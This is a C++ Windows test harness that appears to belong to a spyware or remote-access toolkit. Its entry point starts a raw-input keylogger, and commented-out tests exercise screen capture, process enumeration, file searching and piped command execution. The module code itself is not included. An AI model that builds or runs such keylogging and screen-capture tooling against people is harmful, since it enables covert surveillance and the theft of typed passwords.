#include "ScreenCapture.h"
#include "EnumProcess.h"
#include "SearchFile.h"
#include "KeyLogger.h"
#include "PipeCmd.h"
#include <iostream>
#include <stdio.h>
#include "resource.h"

VOID ScreenCaptureTest()
{
	ScreenCapture sc = ScreenCapture();
	if (sc.say_cheese())
	{
		MessageBox(NULL, _T("Captured"), _T("Screen Capture Test"), MB_OK);
	}

	if (sc.export_image())
	{
		MessageBox(NULL, _T("Writed Image"), _T("Screen Capture Test"), MB_OK);
	}
}

VOID EnumProcessTest()
{
	EnumProcess ep = EnumProcess();

	for (auto process : ep.get_list())
	{
		_tprintf(_T("[%d]\t"), process.first);
		std::cout << process.second << std::endl;
	}
}

VOID SearchFileTest()
{
	SearchFile sf = SearchFile(_T("C:\\Users\\zsy\\AppData\\Local\\Temp"));;
	for (auto fileObj : sf.get_tree())
		std::cout << fileObj;
}

BOOL CALLBACK ProgMainDlg(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	if (WM_INITDIALOG == uiMsg)
	{
		KeyLogger::Init(hWnd);
	}
	else if (WM_CLOSE == uiMsg)
	{
		EndDialog(hWnd, NULL);
	}
	else if (WM_INPUT == uiMsg)
	{
		KeyLogger::GetData(lParam);
	}

	return FALSE;
}

VOID KeyLoggerTest(HINSTANCE hInstance)
{
	DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)ProgMainDlg, NULL);
}

VOID PipeCmdTest()
{
	PipeCmd pc = PipeCmd();
	TCHAR pszRes[2048];
	if (pc.execute(_T("ping 127.0.0.1"), pszRes, 2048))
	{
		_tprintf(_T("%s\n"), pszRes);
	}
	else
	{
		MessageBox(NULL, _T("pipe cmd error.\n"), _T("error"), MB_OK);
	}
}

int WINAPI _tWinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevinstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	KeyLoggerTest(hInstance);
	system("pause");
}

/*int _tmain()
{
	ScreenCaptureTest();
	EnumProcessTest();
	PipeCmdTest();
	SearchFileTest();
	system("pause");
}*/